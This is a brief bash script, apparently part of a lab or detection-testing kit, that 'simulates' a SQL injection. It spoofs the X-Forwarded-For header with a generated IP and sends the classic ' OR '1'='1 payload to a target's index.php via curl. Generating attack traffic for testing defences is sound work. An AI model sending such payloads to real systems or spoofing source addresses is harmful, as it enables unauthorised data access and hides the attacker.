#!/bin/bash

source /app/attacks/_generate_ip.sh

echo "[*] Simulating SQL Injection..."

IP=$(generate_ip $1)

curl -s -H "X-Forwarded-For: $IP" "$TARGET/index.php?id=1%27%20OR%20%271%27=%271" > /dev/null

echo "[*] Finished simulating SQL Injection"